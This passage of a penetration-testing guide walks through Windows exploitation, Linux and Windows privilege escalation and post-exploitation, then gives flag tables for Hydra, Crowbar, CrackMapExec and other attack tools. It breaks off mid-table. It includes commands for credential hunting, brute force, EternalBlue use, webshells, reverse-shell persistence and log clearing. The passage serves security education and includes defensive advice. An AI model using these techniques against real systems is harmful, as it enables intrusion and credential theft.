   - In summary, compile a profile of the target: OS version (e.g., Windows Server 2012 R2?), patch level if determinable (SMB banner or vuln scan might hint if, say, MS17-010 patch is missing), users/accounts (through SMB enum or SNMP), and any obvious weak points (like share “Everyone:C” with full access, or an Outdated IIS version).
3. **Vulnerability Analysis** – Translate the enumeration data into potential exploits:
   - **Missing Patches**: Determine if the Windows host is likely missing critical patches. For example, if a target is Windows 7 and SMBv1 is enabled (and perhaps an Nmap script **indicates MS17-010 vulnerability**), that’s a big target ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=Server%20Message%20Block%20uses%20ports,brute%20force%20SMB%20login%20credentials)). Tools like Nessus or OpenVAS (if allowed in scope) can help identify missing patches. Absent that, manual analysis and use of Nmap vuln scripts or Metasploit’s smb checker can confirm if an exploit like EternalBlue is applicable.
   - **Weak Credentials**: Use any user list from SMB or AD to attempt password spraying (trying common passwords across many accounts) or brute-force specific accounts. For example, try `Administrator:Admin@123` or season/year combos for any discovered usernames. Credentials are a frequent win on Windows networks, especially if account lockout policies are lenient or not all accounts are protected. If one account’s credentials are compromised, assess what access that account has (standard user? domain admin?).
   - **Public Exploits**: Consider known exploit paths for Windows services:
     - SMB exploits like EternalBlue (for OS versions <= Win7/2008) or EternalRomance (for older Win2003) if unpatched.
     - RDP exploit (BlueKeep) if targeting an unpatched Win7/2008 RDP without NLA.
     - IIS exploits depending on version (old IIS 6.0 had a WebDAV exploit CVE-2017-7269, for instance).
     - If a web app is on the server (SharePoint, Outlook Web Access, etc.), check those for known CVEs.
   - **Configuration Flaws**: Look for things like default credentials on services (e.g., an admin panel running on an odd port with default creds, or a service using default password “admin/admin”). On Windows, also consider if the SMB shares reveal sensitive info: e.g., a share “Backups” might contain backup files of the registry or SAM that could be used to extract credentials.
   - Plan out which attack to attempt first based on likelihood of success and stealth. Often, exploiting a vulnerability like EternalBlue is very effective (and was widely used by attackers – e.g., **91.8% of attacks on port 445 have attempted EternalBlue in some studies ([Majority of attacks against SMB protocol attempt to exploit EternalBlue](https://blog.barracuda.com/2022/05/11/attacks-smb-protocol-eternalblue#:~:text=Majority%20of%20attacks%20against%20SMB,to%20use%20the%20EternalBlue%20exploit))**). However, in a hardened environment, that exploit might be patched, so you have alternate plans like password attacks or web exploits.
4. **Exploitation** – Execute the exploits or attacks to gain access:
   - **SMB Exploit Example**: You decide to run the EternalBlue exploit on a vulnerable SMB service. Using Metasploit, configure the `exploit/windows/smb/ms17_010_eternalblue` module with the target IP and appropriate payload (often a Meterpreter reverse shell). When launched, if the target is indeed unpatched and vulnerable, you’ll get a SYSTEM shell on the machine. (If this fails, you might try a different payload or check if the target might have some IDS/IPS blocking the attempt.)
   - **Credential-Based**: Suppose enumeration yielded a valid user credential (e.g., through password spraying you found *User:Spring2023!* works). You could use that credential to SMB into a share (`net use \\target\C$`) if the user is a local admin, or more commonly to WinRM into the host (using Evil-WinRM tool) which gives a PowerShell session as that user. From there, you are “in” and can proceed with post-exploitation. Another path: use those creds with `psexec.py` (Impacket) or Metasploit’s psexec module to get a shell.
   - **Web Shells / IIS**: If exploiting a web vulnerability (say, file upload on an IIS web app), you might upload an ASPX webshell. Navigating to that webshell in a browser gives command execution on the server as the IIS user (often Network Service or SYSTEM for older IIS). For instance, a common technique is exploiting an insecure file upload function to drop an ASPX webshell (`cmd.aspx`) and then using it to run commands.
   - **Client-Side/Luring Attacks**: In some cases, direct server exploits might fail, so consider luring a logged-in admin to execute something (social engineering). For example, using Responder to trick a machine on the network into sending you a hash, then cracking that hash. This strays into red-team tactics, but it’s part of the toolkit if pure exploitation of services doesn’t yield results on hardened systems.
   - Regardless of method, once exploitation is successful, execute a payload that gives you remote control. A Meterpreter session from Metasploit is very powerful for Windows post-exploitation, or a reverse PowerShell or CMD shell will do for manual work. Ensure you have a stable connection (maybe set up multiple backdoors in case one dies).
5. **Post-Exploitation & Privilege Escalation** – On Windows, after gaining an initial foothold (likely as a low-privileged user or even SYSTEM on one machine), focus on escalating privileges and expanding access:
   - If your shell is not already **NT AUTHORITY\SYSTEM**, attempt to escalate to that. This might involve using tools like **Windows Privilege Escalation Awesome Script (WinPEAS)** to enumerate possible weaknesses (unquoted service paths, vulnerable drivers, accessible registry keys, etc.). Common techniques include exploiting services running with SYSTEM privileges that have misconfigurations (detailed in the Privilege Escalation section below). For example, if you find a service with an **unquoted path** running as SYSTEM, and you can write to one of the path directories, you can place an executable there to hijack the service on next start ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=2)).
   - **Credential Dumping**: Windows post-exploitation heavily involves dumping credentials. Use **Mimikatz** or Impacket’s `secretsdump.py` to dump hashes from memory or the SAM database. If you have local admin rights, you can pull all user password hashes and crack them offline or pass-the-hash to other systems. Mimikatz can also extract plain-text passwords from memory (for logged-in users or service accounts) if WDigest or other credentials are present. For instance, obtaining a domain admin’s hash or password from one compromised server is the crown jewel for AD environments.
   - **Lateral Movement**: With some creds or hashes in hand, pivot to other machines. Use CrackMapExec or Metasploit’s `psexec` with the new credentials across the network to find where you can move next. If the initial host was not your final target, use the current foothold to scan the internal network (run PowerShell cmdlets or secondary Nmap scans from that host if allowed) for new targets.
   - **Persistence**: Ensure you can get back in if needed. For example, add a new local user to the Remote Desktop Users group, or set up a scheduled task that opens a reverse shell every hour (in case your current session is lost). In an engagement, you’d document and remove these at the end, but during the test, it secures your access.
   - Throughout post-exploitation, maintain operational security: use built-in Windows tools as much as possible (LOLBAS tactics) to avoid detection. For example, use `net user` to create accounts, `schtasks` for scheduling, etc., rather than uploading large binaries that may trigger antivirus.
   - Begin data exfiltration or objective completion steps. If the goal is to access specific data, locate it (maybe using `dir /s *financial*` to search files, or using PowerShell to search for documents). If the goal is domain admin, continue lateral movement and privilege escalation until that’s achieved (for instance, performing **Kerberoasting** – requesting service tickets to crack — if you have a domain user account, to eventually crack a high-privilege service account password).

*(The key in Windows environments is often to leverage the trust and inter-connectivity of systems: one low-privileged foothold can snowball through reused passwords, accessible shares, and domain trust to compromise the entire domain. The workflow is not strictly linear; you might pivot and escalate in tandem. Always revisit earlier steps if new information emerges — e.g., a config file found post-exploitation might contain credentials that send you back to step 2 for a different service. By following a structured approach, you reduce the chance of missing an obvious path to compromise.)*

**Note:** At each stage for both Linux and Windows, document findings and maintain good operational security. Clean up any test accounts or shells after the engagement. A common pitfall is rushing to exploit without fully enumerating – experienced testers know to be methodical, since a missed vector could be the easiest way in, and exploiting without recon can alert defenders needlessly ([5 Essential Penetration Testing Phases You Can’t Ignore in 2025](https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/penetration-testing-phases/#:~:text=,perform%20a%20useful%20penetration%20test)).

## Privilege Escalation Techniques (Post-Exploitation)
Gaining an initial foothold on a system is often just the first step; testers then attempt to elevate privileges to fully compromise the host (and potentially move laterally in the network). Privilege escalation is the process of going from a limited user account to higher privileges (root/Administrator or SYSTEM) ([Linux Privilege Escalation: Techniques and Security Tips](https://www.vaadata.com/blog/linux-privilege-escalation-techniques-and-security-tips/#:~:text=Privilege%20escalation%20is%20a%20key,of%20access%2C%20with%20greater%20rights)). Below we outline common privilege escalation methods on Linux and Windows systems, along with tools that assist in this phase:

### Linux Privilege Escalation
On Linux, privilege escalation usually involves exploiting configuration weaknesses or vulnerabilities in software to go from a normal user to root ([Linux Privilege Escalation: Techniques and Security Tips](https://www.vaadata.com/blog/linux-privilege-escalation-techniques-and-security-tips/#:~:text=On%20Linux%2C%20there%20are%20several,control%20are%20the%20main%20ones)). Common techniques include:
- **Kernel Exploits** – If the kernel is outdated, local exploits can be used to get root. For example, the infamous **Dirty COW** exploit (CVE-2016-5195) abused a race condition in the kernel’s memory management to gain write access to read-only files, leading to root access ([Linux Privilege Escalation Guide (Updated for 2024)](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/#:~:text=The%20infamous%20DirtyCow%20exploit%20%E2%80%93,73.8)). Tools like `searchsploit` can help find local kernel exploits once you know the kernel version (`uname -a`). Running an exploit will typically spawn a root shell if successful. (Defenders should keep kernels updated; Dirty COW was patched in all major distros after 2016.)
- **SUID/SGID Executables** – Files with the SUID bit run with elevated privileges. Attackers search for unusual SUID-root files (`find / -perm -4000 -type f 2>/dev/null`). If such a binary is outdated or poorly coded, it can be exploited. Even benign tools can be abused; for instance, if `vim` is SUID-root (rare, but as an example), one could run `vim -c '!sh'` to get a root shell. More commonly, custom SUID scripts or binaries with programming flaws (buffer overflows, etc.) are targets.
- **Misconfigured `sudo`** – If the user is allowed to run certain commands as root via sudo (check `sudo -l`), that can often be leveraged. For example, if sudo allows running `python` or `vim` as root without a password, those can be used to spawn a root shell (this is documented in GTFOBins). Even if a command is restricted, sometimes wildcards or environment variables can be abused (e.g., sudoing a binary that can be tricked into running a shell, or exploiting `sudo`edit).
- **World-Writable Files or Sensitive Files** – Attackers look for configuration files or scripts that are world-writable but executed by root. A common scenario is a cron job. For instance, if there’s a cron job running as root every minute executing a script in `/etc/cron.d/backup.sh`, and that script is editable by our low-priv user, one can insert malicious commands into it and wait for the cron to run to get root. Another example: a world-writable `/etc/passwd` or `/etc/shadow` (very bad practice) would allow adding a new root user or editing a root password hash.
- **Credential Reuse & Looting** – Sometimes privilege escalation is achieved not by a software exploit but by finding credentials on the box. Linux users might have SSH keys in their home directories; an attacker who finds a private key in, say, `/home/admin/.ssh/id_rsa` could try it as root’s key or use it to log into other servers as that user. Also, configuration files (like database configs) may contain root DB passwords, which might be reused as system root password. Extracting hashes from `/etc/shadow` (if the user is in a group that can read it, or via a kernel exploit) and cracking them can yield the root password as well.
- **Exploiting Running Services** – If the compromised user can interact with a service running as root on localhost, that can be a path. For example, if there’s a local MySQL service running as root and accessible without a password from localhost, the attacker (as a low user) could connect and use MySQL’s User Defined Functions to execute system commands as root.
- **Path Hijacking (Linux)** – This is less common but if an admin scripted something poorly. For instance, if a root cron job runs a script that calls an external program without using an absolute path, and the attacker can place a malicious program in a directory that comes earlier in `$PATH`, they can hijack the call. E.g., a cron job runs `ls` but doesn’t specify full path; if the attacker puts a fake `ls` in `/tmp` and the cron’s PATH includes `/tmp` before `/bin`, the cron job might execute the attacker’s `/tmp/ls` (which could do anything as root).
- **Automated Enumeration Tools** – Tools like **LinPEAS** and **Linux Exploit Suggester** automate the discovery of the above issues. LinPEAS will highlight suspicious SUID files, sudo privileges, world-writable cron jobs, accessible passwords, kernel versions with known exploits, and more, in color-coded output. **LinEnum** is another script that gathers similar information. These tools greatly speed up the process of privilege escalation analysis on Linux.

From a defensive standpoint, mitigating these issues involves regular patching (to prevent kernel exploits), principle of least privilege (don’t give users unnecessary sudo rights), careful configuration (no world-writable scripts in cron, minimal SUID binaries), and not leaving plaintext creds on disk. System administrators should also monitor for abnormal use of programs with SUID or sudo.

### Windows Privilege Escalation
Windows privilege escalation can be vertical (from a local user to local admin/SYSTEM) or horizontal (from one user to another). Ultimately, attackers aim to reach **Administrator or SYSTEM on the box, or even Domain Administrator** in an Active Directory environment ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=From%20a%20hacker%E2%80%99s%20perspective%2C%20privilege,they%20own%20the%20entire%20network)). Common techniques include:

- **Insecure Service Permissions** – Many Windows services run with SYSTEM privileges. If the file or registry settings for a service are improperly permissioned, a normal user might be able to modify them ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=1)). For example, if a service’s executable is located in `C:\Program Files\SomeService\service.exe` but the ACLs on that folder allow regular users to modify the .exe, an attacker can replace it with a malicious exe. Next time the service starts (or is restarted), it runs the attacker’s code as SYSTEM. Always check: `sc qc ServiceName` to see the binary path, then `icacls` on that path to see permissions.
- **Unquoted Service Path** – A specific case of service misconfiguration. If a Windows service path contains spaces and isn’t quoted (e.g., `C:\Program Files\Some Folder\Service.exe` is stored as an unquoted path), Windows will try to execute up to the first space as a command. In the example, it would look for `C:\Program.exe` then `C:\Program Files\Some.exe`, etc. ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=Surprisingly%2C%20while%20this%20is%20a,which%20that%20service%20is%20running)). If any directory in the path is writable by our user, we can drop a malicious `Program.exe` in `C:\`, and since services often run as SYSTEM, the system will execute our `Program.exe` as SYSTEM on service start ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=common%20to%20find%20many%20services,which%20that%20service%20is%20running)). This is a well-known issue and still found in many services.
- **Weak Registry Permissions** – Similar to file permissions, if a user can edit the registry keys for a service (under `HKLM\SYSTEM\CurrentControlSet\Services\...`), they could change the service’s binary path to point to a malicious executable. Next start of the service = code execution as SYSTEM ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=3)). Always check with `accesschk` from Sysinternals for any keys under HKLM that users can modify.
- **Stored Credentials (Passwords)** – Windows users (and admins) often leave passwords in places they shouldn’t. Attackers will search the system for passwords: common locations include:
  - Registry: Some applications or system features store creds in registry. For instance, the AutoLogon feature stores plaintext password in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`. An attacker can query that if accessible ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=5)). Also, `reg query HKLM /f password /t REG_SZ /s` will search registry for keys containing “password” ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=Attackers%20can%20quickly%20search%20for,the%20common%20techniques%2C%20such%20as)).
  - Filesystem: scanning through config files (`.config`, `.ini`, `.txt`) for keywords like “Password=” ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=Searching%20the%20file%20system%20within,txt)). For example, `findstr /si password *.txt *.config *.ini` across the drive can find credentials in files ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=Searching%20the%20file%20system%20within,txt)). Many times, admins might save a script with embedded creds or a text file with passwords (as shocking as that is). The cited example ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=5)) shows that it’s still common to find such passwords in practice.
  - Browser credentials: If the user account has saved browser passwords and the pentester has GUI or sufficient access, tools or even the browser itself can reveal those. Mimikatz has functionality to scrape some of these as well.
  - SAM database & hashes: If the attacker is local admin (or SYSTEM), they can access `C:\Windows\System32\config\SAM` and SYSTEM hive to dump password hashes ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=7)). Even without being admin, sometimes backups of the registry (like System Restore points or Volume Shadow Copies) are accessible to normal users and contain these hives. Once you have the hashes, you can crack them or pass-the-hash. For instance, if the Administrator’s password hash is obtained and it’s crackable, that’s game over locally. Or use the Administrator hash directly to authenticate to other machines (if the same local admin password is reused).
- **Token Impersonation / Named Pipe Impersonation** – On older Windows or misconfigured ones, certain services that run as SYSTEM can be tricked into executing code. Tools like **JuicyPotato** or **RoguePotato** exploit the way services create tokens. If the current user is in the **Local Service** or **Service** group (like IIS APPPOOL identities), they might escalate to SYSTEM by hijacking tokens. This is a rather advanced technique, but important in scenarios like compromising IIS webserver user and wanting SYSTEM.
- **DLL Hijacking** – If a service or program runs as SYSTEM and tries to load a DLL that is missing (and the user can write to a directory in the DLL search path), the user can place a malicious DLL to be loaded by that high-privilege process. This often requires either an existing service that runs as SYSTEM or waiting for an admin to run a program. Notable places to check are services set to auto-start – if they reference DLLs in unsecured paths.
- **Scheduled Tasks** – If there’s a scheduled task running with highest privileges (System) and the user can modify its action or the file it runs, that’s similar to cron job hijacking. An example: a task that runs a script from `C:\scripts\backup.ps1` daily as SYSTEM – if users can edit that script, they get SYSTEM at the next run.
- **User Privileges** – Sometimes standard users have been mistakenly given higher privileges. For instance, membership in the **Administrators** group (obvious), or even in Power Users (less useful on modern OS), or specific privileges like SeBackupPrivilege which could allow them to create backup shadows of drives (and thus read any file). A tool called **whoami /priv** will list the current user’s privileges. Unusual ones like SeDebugPrivilege or SeBackupPrivilege can be abused (e.g., SeBackupPrivilege can be used with BackupRead/Write functions to read any file, including SAM). If a user has SeImpersonatePrivilege (common for service accounts), that’s exactly the scenario for token impersonation attacks like JuicyPotato to get SYSTEM.
- **Lateral / Domain Escalation** – If the machine is part of a domain, local priv esc might not be the end goal; domain admin might be. Techniques then extend to the domain: **Kerberoasting** (get Service Principal Name tickets to crack them), AS-REP roasting (crackable encrypted tickets for users not requiring pre-auth), abusing trust relationships, or forging Kerberos tickets (Golden Ticket, Silver Ticket, etc.) once domain privileges are obtained. For example, once the attacker dumps credentials from one machine, they might find a domain admin reused a local admin password, etc., leading to domain compromise.
- **Automated Tools** – **WinPEAS** is the Windows counterpart to LinPEAS, enumerating registry, services, privileges, etc., to suggest escalation paths. **PowerUp (PowerShell)** is another script that checks for common misconfigurations (unquoted paths, service perms, registry perms) and even provides ready-to-use exploitation functions for them. Running these can quickly highlight “Hey, this service XYZ has unquoted path and you can write to C:\, you can escalate!” 
   - Additionally, **Seatbelt** (a C# tool by SpecterOps) can enumerate a ton of info on a Windows host (installed software, privileges, sensitive files) which might reveal something useful.
   - **Mimikatz** deserves another mention: beyond credential theft, it can abuse certain privileges to escalate. For instance, if the user has SeDebugPrivilege, Mimikatz can inject into a SYSTEM process and get SYSTEM that way.
   - Many of these techniques are also documented in the MITRE ATT&CK framework, and testers will try to methodically go through likely misconfigurations.

From a defender’s perspective, mitigating Windows priv-esc involves: keeping systems patched (no known kernel or RDP exploits), using tools like Microsoft’s Security Compliance Toolkit to ensure secure permissions, avoiding shared local admin passwords (use LAPS), removing unnecessary privileges from users, and monitoring for unusual system changes (like new services or tasks). For instance, noticing if an innocuous service path is unquoted or a user unexpectedly is in the local Administrators group can preempt these attacks ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=6)).

### Post-Exploitation Tools and Techniques
After escalating privileges, the focus shifts to **maintaining access, lateral movement, and completing objectives**:
- **Maintaining Access:** Attackers may install backdoors or create new accounts. On Linux, this could be adding a user to `/etc/passwd` or adding SSH authorized_keys for root. On Windows, it could be a new local admin user or a scheduled task that opens a reverse shell. They might also employ rootkits or trojans (in a real APT scenario) to hide presence. Penetration testers will often demonstrate a persistence mechanism but remove it afterwards.
- **Covering Tracks:** A crucial post-exploitation step. Clearing logs (Windows Event logs, `.bash_history` on Linux, etc.) can help avoid detection. However, skilled defenders may have centralized logging, so this isn’t foolproof. Testers may just note what could be cleared.
- **Data Exfiltration:** If the goal is to retrieve sensitive data, the tester will use the elevated access to collect that data. They might use tools like `7zip` to compress data and then exfiltrate over an allowed channel (HTTPS, DNS tunneling, etc.). For testing, often just demonstrating read access is enough (you might not actually steal the data).
- **Pivoting:** With a high-privileged position on one host, testers pivot to others. For example, using a SOCKS proxy through Meterpreter to route traffic and scan the internal network further. This is where the initial foothold on one machine becomes a launchpad for attacking others that were not accessible externally.
- **Credential Reuse:** Harvested credentials are tried everywhere. If a Domain Admin credential is obtained on one server, the tester will use that to seamlessly access any other machine in the domain (that’s basically game over for the entire domain’s security). In engagements like red teams, they might proceed to simulate actions on objectives (e.g., finding the CEO’s emails, or retrieving sensitive database records) once domain admin is achieved.
- **Reporting and Documentation:** Although not a “technique,” in a professional context the tester at this point consolidates the findings: how they escalated privileges, what was compromised, and the potential impact. This is communicated to the client so they can remediate.

Privilege escalation and post-exploitation are where a penetration test demonstrates the **real impact** of earlier vulnerabilities. A low-severity issue during initial access can become critical when combined with others (for instance, a leaked credential + an unpatched system = full domain takeover). Thus, this phase is crucial for showing why even minor misconfigurations should be taken seriously. In summary, both Linux and Windows have multiple avenues for privilege escalation – a penetration tester will enumerate as many as possible and choose the path of least resistance to reach the highest privileges on the target system ([Linux Privilege Escalation: Techniques and Security Tips](https://www.vaadata.com/blog/linux-privilege-escalation-techniques-and-security-tips/#:~:text=On%20Linux%2C%20there%20are%20several,control%20are%20the%20main%20ones)) ([Privilege Escalation on Windows (With Examples)](https://delinea.com/blog/windows-privilege-escalation#:~:text=When%20performing%20enumeration%2C%20attackers%20are,privilege%20escalation%20exploits%2C%20such%20as)). The defense should be layered such that even if an attacker gets in, these common escalation paths are mitigated or monitored.

---

## Glossary

### Burp Suite
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>burpsuite</code></td>
      <td><code>burpsuite</code></td>
      <td>Launches Burp Suite Community Edition.</td>
    </tr>
    <tr>
      <td><code>--config-file [file]</code></td>
      <td><code>--config-file burp.config</code></td>
      <td>Loads configuration from a specified file.</td>
    </tr>
    <tr>
      <td><code>--project-file [file]</code></td>
      <td><code>--project-file project.burp</code></td>
      <td>Loads a saved project file.</td>
    </tr>
  </tbody>
</table>

### Crowbar
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>crowbar</code></td>
      <td><code>crowbar -b rdp -s 192.168.1.100 -U users.txt -P pass.txt</code></td>
      <td>Invokes Crowbar to brute-force protocols like RDP.</td>
    </tr>
    <tr>
      <td><code>-b [service]</code></td>
      <td><code>-b rdp</code></td>
      <td>Specifies the service to attack (e.g., rdp, vnc, ssh).</td>
    </tr>
    <tr>
      <td><code>-s [target]</code></td>
      <td><code>-s 192.168.1.100</code></td>
      <td>Specifies the target IP address.</td>
    </tr>
    <tr>
      <td><code>-U [userfile]</code></td>
      <td><code>-U users.txt</code></td>
      <td>Uses a file containing usernames.</td>
    </tr>
    <tr>
      <td><code>-P [passfile]</code></td>
      <td><code>-P pass.txt</code></td>
      <td>Uses a file containing passwords.</td>
    </tr>
  </tbody>
</table>

### CrackMapExec
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>crackmapexec</code></td>
      <td><code>crackmapexec smb 192.168.1.0/24 -u administrator -p secret</code></td>
      <td>Invokes CrackMapExec for automated post-exploitation tasks.</td>
    </tr>
    <tr>
      <td><code>-u [username]</code></td>
      <td><code>-u admin</code></td>
      <td>Specifies a single username.</td>
    </tr>
    <tr>
      <td><code>-p [password]</code></td>
      <td><code>-p secret</code></td>
      <td>Specifies a single password.</td>
    </tr>
    <tr>
      <td><code>--shares</code></td>
      <td><code>--shares</code></td>
      <td>Enumerates SMB shares on the target.</td>
    </tr>
    <tr>
      <td><code>-d [domain]</code></td>
      <td><code>-d example.local</code></td>
      <td>Specifies the domain for authentication.</td>
    </tr>
    <tr>
      <td><code>-M [module]</code></td>
      <td><code>-M smb::exec</code></td>
      <td>Runs a specific module against the target.</td>
    </tr>
  </tbody>
</table>

### Dirb
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>dirb</code></td>
      <td><code>dirb http://example.com/ /usr/share/wordlists/dirb/common.txt</code></td>
      <td>Launches Dirb for web directory enumeration.</td>
    </tr>
    <tr>
      <td><code>[URL]</code></td>
      <td><code>http://example.com/</code></td>
      <td>Specifies the target URL.</td>
    </tr>
    <tr>
      <td><code>[wordlist]</code></td>
      <td><code>/usr/share/wordlists/dirb/common.txt</code></td>
      <td>Uses a wordlist for directory scanning.</td>
    </tr>
  </tbody>
</table>

### Enum4linux
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>enum4linux</code></td>
      <td><code>enum4linux 192.168.1.100</code></td>
      <td>Invokes enum4linux for SMB enumeration on Windows.</td>
    </tr>
    <tr>
      <td><code>[target]</code></td>
      <td><code>192.168.1.100</code></td>
      <td>Specifies the target IP or hostname.</td>
    </tr>
    <tr>
      <td><code>-a</code></td>
      <td><code>-a</code></td>
      <td>Runs all enumeration options.</td>
    </tr>
    <tr>
      <td><code>-u [user]</code></td>
      <td><code>-u guest</code></td>
      <td>Specifies a username for authentication.</td>
    </tr>
    <tr>
      <td><code>-p [password]</code></td>
      <td><code>-p guest</code></td>
      <td>Specifies a password for authentication.</td>
    </tr>
  </tbody>
</table>

### FFUF
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>ffuf</code></td>
      <td><code>ffuf -u http://example.com/FUZZ -w wordlist.txt</code></td>
      <td>Invokes FFUF for web content fuzzing.</td>
    </tr>
    <tr>
      <td><code>-u [URL]</code></td>
      <td><code>-u http://example.com/FUZZ</code></td>
      <td>Specifies the target URL with a FUZZ placeholder.</td>
    </tr>
    <tr>
      <td><code>-w [wordlist]</code></td>
      <td><code>-w /path/to/wordlist.txt</code></td>
      <td>Specifies the wordlist to use for fuzzing.</td>
    </tr>
    <tr>
      <td><code>-mc [status]</code></td>
      <td><code>-mc 200,301</code></td>
      <td>Filters responses by matching specific status codes.</td>
    </tr>
    <tr>
      <td><code>-fc [status]</code></td>
      <td><code>-fc 404,403</code></td>
      <td>Filters responses by excluding specific status codes.</td>
    </tr>
    <tr>
      <td><code>-fs [size]</code></td>
      <td><code>-fs 1234</code></td>
      <td>Filters responses based on response size (in bytes).</td>
    </tr>
    <tr>
      <td><code>-ac</code></td>
      <td><code>-ac</code></td>
      <td>Automatically calibrates filter settings.</td>
    </tr>
    <tr>
      <td><code>-v</code></td>
      <td><code>-v</code></td>
      <td>Enables verbose mode.</td>
    </tr>
  </tbody>
</table>

### Gobuster
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>gobuster</code></td>
      <td><code>gobuster dir -u http://example.com -w wordlist.txt</code></td>
      <td>Invokes Gobuster for directory and DNS enumeration.</td>
    </tr>
    <tr>
      <td><code>dir</code></td>
      <td><code>gobuster dir ...</code></td>
      <td>Sets mode to directory/file enumeration.</td>
    </tr>
    <tr>
      <td><code>dns</code></td>
      <td><code>gobuster dns -d example.com -w dns.txt</code></td>
      <td>Sets mode to DNS subdomain enumeration.</td>
    </tr>
    <tr>
      <td><code>-u [URL]</code></td>
      <td><code>-u http://example.com</code></td>
      <td>Specifies the target URL.</td>
    </tr>
    <tr>
      <td><code>-w [wordlist]</code></td>
      <td><code>-w /path/to/wordlist.txt</code></td>
      <td>Specifies the wordlist for enumeration.</td>
    </tr>
    <tr>
      <td><code>-t [threads]</code></td>
      <td><code>-t 50</code></td>
      <td>Sets the number of concurrent threads.</td>
    </tr>
    <tr>
      <td><code>-x [extensions]</code></td>
      <td><code>-x php,html,js</code></td>
      <td>Specifies file extensions to search for (comma-separated list).</td>
    </tr>
    <tr>
      <td><code>-o [file]</code></td>
      <td><code>-o gobuster.txt</code></td>
      <td>Outputs results to a specified file.</td>
    </tr>
  </tbody>
</table>

### Hashcat
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>hashcat</code></td>
      <td><code>hashcat -m 0 hashes.txt wordlist.txt</code></td>
      <td>Invokes Hashcat for GPU-accelerated password cracking.</td>
    </tr>
    <tr>
      <td><code>-m [hash-type]</code></td>
      <td><code>-m 0</code></td>
      <td>Specifies the hash type (e.g., 0 for MD5).</td>
    </tr>
    <tr>
      <td><code>[hashfile]</code></td>
      <td><code>hashes.txt</code></td>
      <td>Specifies the file containing hashes.</td>
    </tr>
    <tr>
      <td><code>[wordlist]</code></td>
      <td><code>wordlist.txt</code></td>
      <td>Specifies the wordlist to use for cracking.</td>
    </tr>
    <tr>
      <td><code>-a [attack-mode]</code></td>
      <td><code>-a 0</code></td>
      <td>Sets the attack mode (0 for straight mode, 3 for brute-force, etc.).</td>
    </tr>
  </tbody>
</table>

### Hydra
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>hydra</code></td>
      <td><code>hydra -l admin -p secret 192.168.1.100 ssh</code></td>
      <td>Invokes Hydra for brute force and dictionary attacks.</td>
    </tr>
    <tr>
      <td><code>-l [login]</code></td>
      <td><code>-l admin</code></td>
      <td>Specifies a single login name.</td>
    </tr>
    <tr>
      <td><code>-L &lt;file&gt;</code></td>
      <td><code>-L logins.txt</code></td>
      <td>Uses a file containing a list of login names.</td>
    </tr>
    <tr>
      <td><code>-p [password]</code></td>
      <td><code>-p password123</code></td>
      <td>Specifies a single password.</td>
    </tr>
    <tr>
      <td><code>-P [file]</code></td>
      <td><code>-P passwords.txt</code></td>
      <td>Uses a file containing a list of passwords.</td>
    </tr>
    <tr>
      <td><code>-t [tasks]</code></td>
      <td><code>-t 16</code></td>
      <td>Sets the number of parallel tasks (default is 16).</td>
    </tr>
    <tr>
      <td><code>-v</code></td>
      <td><code>-v</code></td>
      <td>Enables verbose mode.</td>
    </tr>
    <tr>
      <td><code>-V</code></td>
      <td><code>-V</code></td>
      <td>Enables very verbose mode.</td>
    </tr>
    <tr>
      <td><code>-f</code></td>
      <td><code>-f</code></td>
      <td>Stops the attack after the first successful login.</td>
    </tr>
    <tr>
